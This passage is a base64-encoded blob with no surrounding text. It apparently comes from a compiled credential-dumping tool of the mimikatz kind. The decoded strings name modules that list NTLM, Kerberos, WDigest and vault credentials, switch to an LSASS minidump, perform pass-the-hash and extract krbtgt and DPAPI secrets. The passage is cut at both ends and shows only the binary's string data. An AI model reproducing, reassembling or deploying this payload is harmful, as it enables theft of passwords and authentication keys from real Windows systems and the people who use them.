uAGQAbABsAAAAVABlAHIAbQBTAGUAcgB2AGkAYwBlAAAAAAAAAAAAAABXAGkAbgBkAG8AdwBzACAAVgBhAHUAbAB0AC8AQwByAGUAZABlAG4AdABpAGEAbAAgAG0AbwBkAHUAbABlAAAAdgBhAHUAbAB0AGMAbABpAAAAAAAAAAAAVmF1bHRFbnVtZXJhdGVJdGVtVHlwZXMAVmF1bHRFbnVtZXJhdGVWYXVsdHMAAAAAVmF1bHRPcGVuVmF1bHQAAFZhdWx0R2V0SW5mb3JtYXRpb24AAAAAAFZhdWx0RW51bWVyYXRlSXRlbXMAAAAAAFZhdWx0Q2xvc2VWYXVsdABWYXVsdEZyZWUAAAAAAAAAVmF1bHRHZXRJdGVtAAAAAEQAbwBtAGEAaQBuACAAUABhAHMAcwB3AG8AcgBkAAAARABvAG0AYQBpAG4AIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAAAAAAEQAbwBtAGEAaQBuACAARQB4AHQAZQBuAGQAZQBkAAAAUABpAG4AIABMAG8AZwBvAG4AAAAAAAAAUABpAGMAdAB1AHIAZQAgAFAAYQBzAHMAdwBvAHIAZAAAAAAAAAAAAEIAaQBvAG0AZQB0AHIAaQBjAAAAAAAAAE4AZQB4AHQAIABHAGUAbgBlAHIAYQB0AGkAbwBuACAAQwByAGUAZABlAG4AdABpAGEAbAAAAAAACgBWAGEAdQBsAHQAIAA6ACAAAAAAAAAACQBJAHQAZQBtAHMAIAAoACUAdQApAAoAAAAAAAAAAAAJACAAJQAyAHUALgAJACUAcwAKAAAAAAAJAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkATABhAHMAdABXAHIAaQB0AHQAZQBuACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkARgBsAGEAZwBzACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAkACQBSAGUAcwBzAG8AdQByAGMAZQAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBJAGQAZQBuAHQAaQB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAAAAAAAkACQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByACAAIAAgADoAIAAAAAAAAAAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAlADIAdQAgACAAIAAgACAAOgAgAAAAAAAAAAkACQAqAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABvAHIAKgAgADoAIAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0ACAAOwAgAFYAYQB1AGwAdABHAGUAdABJAHQAZQBtADcAIAA6ACAAJQAwADgAeAAAAAAACQAJAFAAYQBjAGsAYQBnAGUAUwBpAGQAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0ACAAOwAgAFYAYQB1AGwAdABHAGUAdABJAHQAZQBtADgAIAA6ACAAJQAwADgAeAAAAAAACgAJAAkAKgAqACoAIAAlAHMAIAAqACoAKgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAIAA7ACAAVgBhAHUAbAB0AEUAbgB1AG0AZQByAGEAdABlAFYAYQB1AGwAdABzACAAOgAgADAAeAAlADAAOAB4AAoAAAAAAAAAAAAJAAkAVQBzAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAlAHMAXAAlAHMAAAAAAAAAAAAAAAAAAABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AXABMAG8AZwBvAG4AVQBJAFwAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQAAAAAAAAAAABiAGcAUABhAHQAaAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgADIAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIAAxACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAUwBJAEQAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABDAG8AbgB2AGUAcgB0AFMAaQBkAFQAbwBTAHQAcgBpAG4AZwBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAJAAkAUABhAHMAcwB3AG8AcgBkACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAAAJAAkAUABJAE4AIABDAG8AZABlACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADQAaAB1AAoAAAAAAAkACQBCAGEAYwBrAGcAcgBvAHUAbgBkACAAcABhAHQAaAAgADoAIAAlAHMACgAAAAAAAAAAAAAACQAJAFAAaQBjAHQAdQByAGUAIABwAGEAcwBzAHcAbwByAGQAIAAoAGcAcgBpAGQAIABpAHMAIAAxADUAMAAqADEAMAAwACkACgAAAAAAAAAJAAkAIABbACUAdQBdACAAAAAAAAAAAABwAG8AaQBuAHQAIAAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACkAAAAAAGMAbABvAGMAawB3AGkAcwBlAAAAAAAAAGEAbgB0AGkAYwBsAG8AYwBrAHcAaQBzAGUAAAAAAAAAAAAAAAAAAABjAGkAcgBjAGwAZQAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACAAOwAgAHIAIAA9ACAAJQAzAHUAKQAgAC0AIAAlAHMAAAAAAAAAAAAAAAAAAABsAGkAbgBlACAAIAAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACkAIAAtAD4AIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApAAAAAAAAACUAdQAKAAAACQAJAFAAcgBvAHAAZQByAHQAeQAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAJQAuACoAcwBcAAAAAAAAACUALgAqAHMAAAAAAAAAAAB0AG8AZABvACAAPwAKAAAACQBOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAcwAKAAAAAAAAAHQAZQBtAHAAIAB2AGEAdQBsAHQAAAAAAAkAUABhAHQAaAAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAAAAAlAGgAdQAAACUAdQAAAAAAWwBUAHkAcABlACAAJQB1AF0AIAAAAAAAZwBlAG4AZQByAGkAYwAAAGQAbwBtAGEAaQBuAF8AcABhAHMAcwB3AG8AcgBkAAAAZABvAG0AYQBpAG4AXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAAAAAAGQAbwBtAGEAaQBuAF8AdgBpAHMAaQBiAGwAZQBfAHAAYQBzAHMAdwBvAHIAZAAAAGcAZQBuAGUAcgBpAGMAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAAABkAG8AbQBhAGkAbgBfAGUAeAB0AGUAbgBkAGUAZAAAAG4AbwBuAGUAAAAAAAAAAABzAGUAcwBzAGkAbwBuAAAAZQBuAHQAZQByAHAAcgBpAHMAZQAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEAdQBlAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAD8AIAAoAFAAZQByAHMAaQBzAHQAIAA+ACAAbQBhAHgAaQBtAHUAbQApAAAAAAAAAD8AIAAoAHQAeQBwAGUAIAA+ACAAQwBSAEUARABfAFQAWQBQAEUAXwBNAEEAWABJAE0AVQBNACkAAAAAAAAAAAA8AE4AVQBMAEwAPgAAAAAAAAAAAAAAAABUAGEAcgBnAGUAdABOAGEAbQBlACAAOgAgACUAcwAgAC8AIAAlAHMACgBVAHMAZQByAE4AYQBtAGUAIAAgACAAOgAgACUAcwAKAEMAbwBtAG0AZQBuAHQAIAAgACAAIAA6ACAAJQBzAAoAVAB5AHAAZQAgACAAIAAgACAAIAAgADoAIAAlAHUAIAAtACAAJQBzAAoAUABlAHIAcwBpAHMAdAAgACAAIAAgADoAIAAlAHUAIAAtACAAJQBzAAoARgBsAGEAZwBzACAAIAAgACAAIAAgADoAIAAlADAAOAB4AAoAQQB0AHQAcgBpAGIAdQB0AGUAcwAgADoACgAAAAAAQwByAGUAZABlAG4AdABpAGEAbAAgADoAIAAAAAAAAABpAG4AZgBvAHMAAAAAAAAAbQBpAG4AZQBzAHcAZQBlAHAAZQByAAAATQBpAG4AZQBTAHcAZQBlAHAAZQByACAAbQBvAGQAdQBsAGUAAAAAAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgAuAGUAeABlAAAARgBpAGUAbABkACAAOgAgACUAdQAgAHIAIAB4ACAAJQB1ACAAYwAKAE0AaQBuAGUAcwAgADoAIAAlAHUACgAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABNAGUAbQBvAHIAeQAgAEMAIAAoAFIAIAA9ACAAJQB1ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATQBlAG0AbwByAHkAIABSAAoAAAAAACUAQwAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAAQgBvAGEAcgBkACAAYwBvAHAAeQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwBhAG0AZQAgAGMAbwBwAHkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwAgAGMAbwBwAHkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwBsAG8AYgBhAGwAIABjAG8AcAB5AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAAUwBlAGEAcgBjAGgAIABpAHMAIABLAE8ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATQBpAG4AZQBzAHcAZQBlAHAAZQByACAATgBUACAASABlAGEAZABlAHIAcwAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABNAGkAbgBlAHMAdwBlAGUAcABlAHIAIABQAEUAQgAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE4AbwAgAE0AaQBuAGUAUwB3AGUAZQBwAGUAcgAgAGkAbgAgAG0AZQBtAG8AcgB5ACEACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAXwBwAGEAcgBzAGUARgBpAGUAbABkACAAOwAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAGEAZAAgAGUAbABlAG0AZQBuAHQAcwAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgA6ACAAJQB1AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwBfAHAAYQByAHMAZQBGAGkAZQBsAGQAIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAcgBlAGYAZQByAGUAbgBjAGUAcwAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgA6ACAAJQB1AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzAF8AcABhAHIAcwBlAEYAaQBlAGwAZAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQBhAGQAIAByAGUAZgBlAHIAZQBuAGMAZQBzAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzAF8AcABhAHIAcwBlAEYAaQBlAGwAZAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQBhAGQAIABmAGkAcgBzAHQAIABlAGwAZQBtAGUAbgB0AAoAAAAAAAAAbABzAGEAcwByAHYAAAAAAExzYUlDYW5jZWxOb3RpZmljYXRpb24AAExzYUlSZWdpc3Rlck5vdGlmaWNhdGlvbgAAAAAAAAAAYgBjAHIAeQBwAHQAAAAAAEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlcgAAAAAAQkNyeXB0U2V0UHJvcGVydHkAAAAAAAAAQkNyeXB0R2V0UHJvcGVydHkAAAAAAAAAQkNyeXB0R2VuZXJhdGVTeW1tZXRyaWNLZXkAAAAAAABCQ3J5cHRFbmNyeXB0AAAAQkNyeXB0RGVjcnlwdAAAAEJDcnlwdERlc3Ryb3lLZXkAAAAAAAAAAEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIAAAAAMwBEAEUAUwAAAAAAAAAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAEMAQgBDAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAAAAAAAAAAABPAGIAagBlAGMAdABMAGUAbgBnAHQAaAAAAAAAAAAAAEEARQBTAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAQwBGAEIAAABtAHMAdgAAAEwAaQBzAHQAcwAgAEwATQAgACYAIABOAFQATABNACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAdwBkAGkAZwBlAHMAdAAAAEwAaQBzAHQAcwAgAFcARABpAGcAZQBzAHQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAAAATABpAHMAdABzACAASwBlAHIAYgBlAHIAbwBzACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAAB0AHMAcABrAGcAAAAAAAAATABpAHMAdABzACAAVABzAFAAawBnACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAbABpAHYAZQBzAHMAcAAAAEwAaQBzAHQAcwAgAEwAaQB2AGUAUwBTAFAAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAAAAcwBzAHAAAABMAGkAcwB0AHMAIABTAFMAUAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAABsAG8AZwBvAG4AUABhAHMAcwB3AG8AcgBkAHMAAAAAAEwAaQBzAHQAcwAgAGEAbABsACAAYQB2AGEAaQBsAGEAYgBsAGUAIABwAHIAbwB2AGkAZABlAHIAcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAAAAAAAAAAAAAAFMAdwBpAHQAYwBoACAAKABvAHIAIAByAGUAaQBuAGkAdAApACAAdABvACAATABTAEEAUwBTACAAcAByAG8AYwBlAHMAcwAgACAAYwBvAG4AdABlAHgAdAAAAAAAAAAAAG0AaQBuAGkAZAB1AG0AcAAAAAAAAAAAAAAAAAAAAAAAUwB3AGkAdABjAGgAIAAoAG8AcgAgAHIAZQBpAG4AaQB0ACkAIAB0AG8AIABMAFMAQQBTAFMAIABtAGkAbgBpAGQAdQBtAHAAIABjAG8AbgB0AGUAeAB0AAAAAAAAAAAAcAB0AGgAAABQAGEAcwBzAC0AdABoAGUALQBoAGEAcwBoAAAAAAAAAGsAcgBiAHQAZwB0ACEAAABkAHAAYQBwAGkAcwB5AHMAdABlAG0AAABEAFAAQQBQAEkAXwBTAFkAUwBUAEUATQAgAHMAZQBjAHIAZQB0AAAAQQBuAHQAaQBzAG8AYwBpAGEAbAAAAAAAUAByAGUAZgBlAHIAcgBlAGQAIABCAGEAYwBrAHUAcAAgAE0AYQBzAHQAZQByACAAawBlAHkAcwAAAAAAAAAAAHQAaQBjAGsAZQB0AHMAAABMAGkAcwB0ACAASwBlAHIAYgBlAHIAbwBzACAAdABpAGMAawBlAHQAcwAAAAAAAABlAGsAZQB5AHMAAAAAAAAATABpAHMAdAAgAEsAZQByAGIAZQByAG8AcwAgAEUAbgBjAHIAeQBwAHQAaQBvAG4AIABLAGUAeQBzAAAAAAAAAEwAaQBzAHQAIABDAGEAYwBoAGUAZAAgAE0AYQBzAHQAZQByAEsAZQB5AHMAAAAAAGMAcgBlAGQAbQBhAG4AAABMAGkAcwB0ACAAQwByAGUAZABlAG4AdABpAGEAbABzACAATQBhAG4AYQBnAGUAcgAAAAAAAAAAAHMAZQBrAHUAcgBsAHMAYQAAAAAAAAAAAFMAZQBrAHUAcgBMAFMAQQAgAG0AbwBkAHUAbABlAAAAUwBvAG0AZQAgAGMAbwBtAG0AYQBuAGQAcwAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4ALgAuAAAAAAAAAFMAdwBpAHQAYwBoACAAdABvACAAUABSAE8AQwBFAFMAUwAKAAAAAABTAHcAaQB0AGMAaAAgAHQAbwAgAE0ASQBOAEkARABVAE0AUAAgADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AaQBuAGkAZAB1AG0AcAAgADsAIAA8AG0AaQBuAGkAZAB1AG0AcABmAGkAbABlAC4AZABtAHAAPgAgAGEAcgBnAHUAbQBlAG4AdAAgAGkAcwAgAG0AaQBzAHMAaQBuAGcACgAAAAAAAAAAAAAAAAAAAAAATwBwAGUAbgBpAG4AZwAgADoAIAAnACUAcwAnACAAZgBpAGwAZQAgAGYAbwByACAAbQBpAG4AaQBkAHUAbQBwAC4ALgAuAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABTAEEAUwBTACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkACAAKAA/ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIABwAEkAbgBmAG8AcwAtAD4ATQBhAGoAbwByAFYAZQByAHMAaQBvAG4AIAAoACUAdQApACAAIQA9ACAATQBJAE0ASQBLAEEAVABaAF8ATgBUAF8ATQBBAEoATwBSAF8AVgBFAFIAUwBJAE8ATgAgACgAJQB1ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHAASQBuAGYAbwBzAC0APgBQAHIAbwBjAGUAcwBzAG8AcgBBAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAgACgAJQB1ACkAIAAhAD0AIABQAFIATwBDAEUAUwBTAE8AUgBfAEEAUgBDAEgASQBUAEUAQwBUAFUAUgBFAF8AQQBNAEQANgA0ACAAKAAlAHUAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHcAaQB0AGgAbwB1AHQAIABTAHkAcwB0AGUAbQBJAG4AZgBvAFMAdAByAGUAYQBtACAAKAA/ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABLAGUAeQAgAGkAbQBwAG8AcgB0AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAG8AZwBvAG4AIABsAGkAcwB0AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAG8AZAB1AGwAZQBzACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAHMACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AZQBtAG8AcgB5ACAAbwBwAGUAbgBpAG4AZwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABIAGEAbgBkAGwAZQAgAG8AbgAgAG0AZQBtAG8AcgB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAbwBjAGEAbAAgAEwAUwBBACAAbABpAGIAcgBhAHIAeQAgAGYAYQBpAGwAZQBkAAoAAAAAAAAAAAAJACUAcwAgADoACQAAAAAAVQBuAGQAZQBmAGkAbgBlAGQATABvAGcAbwBuAFQAeQBwAGUAAAAAAFUAbgBrAG4AbwB3AG4AIAAhAAAAAAAAAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAE4AZQB0AHcAbwByAGsAAABCAGEAdABjAGgAAAAAAAAAUwBlAHIAdgBpAGMAZQAAAFAAcgBvAHgAeQAAAAAAAABVAG4AbABvAGMAawAAAAAATgBlAHQAdwBvAHIAawBDAGwAZQBhAHIAdABlAHgAdAAAAAAAAAAAAE4AZQB3AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAAUgBlAG0AbwB0AGUASQBuAHQAZQByAGEAYwB0AGkAdgBlAAAAAAAAAEMAYQBjAGgAZQBkAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAAAAAABDAGEAYwBoAGUAZABSAGUAbQBvAHQAZQBJAG4AdABlAHIAYQBjAHQAaQB2AGUAAABDAGEAYwBoAGUAZABVAG4AbABvAGMAawAAAAAAAAAAAAoAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAASQBkACAAOgAgACUAdQAgADsAIAAlAHUAIAAoACUAMAA4AHgAOgAlADAAOAB4ACkACgBTAGUAcwBzAGkAbwBuACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAZgByAG8AbQAgACUAdQAKAFUAcwBlAHIAIABOAGEAbQBlACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAEQAbwBtAGEAaQBuACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAEwAbwBnAG8AbgAgAFMAZQByAHYAZQByACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAAAAAAAAAAAATABvAGcAbwBuACAAVABpAG0AZQAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAUwBJAEQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAAUAByAGUAdgBpAG8AdQBzAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBrAHIAYgB0AGcAdAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIABLAEQAQwAgAHAAYQB0AHQAZQByAG4AIABpAG4AIABMAFMAQQBTAFMAIABtAGUAbQBvAHIAeQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AawByAGIAdABnAHQAIAA7ACAASwBEAEMAIABzAGUAcgB2AGkAYwBlACAAbgBvAHQAIABpAG4AIABMAFMAQQBTAFMAIABtAGUAbQBvAHIAeQAKAAAACgAlAHMAIABrAHIAYgB0AGcAdAA6ACAAAAAAAAAAAAAlAHUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMACgAAAAkAIAAqACAAJQBzACAAOgAgAAAAAAAAAEQAUABBAFAASQBfAFMAWQBTAFQARQBNAAoAAAAAAAAAZgB1AGwAbAA6ACAAAAAAAAoAbQAvAHUAIAA6ACAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AZABwAGEAcABpAF8AcwB5AHMAdABlAG0AIAA7ACAATgBvAHQAIABpAG4AaQB0AGkAYQBsAGkAegBlAGQAIQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGQAcABhAHAAaQBfAHMAeQBzAHQAZQBtACAAOwAgAFAAYQB0AHQAZQByAG4AIABuAG8AdAAgAGYAbwB1AG4AZAAgAGkAbgA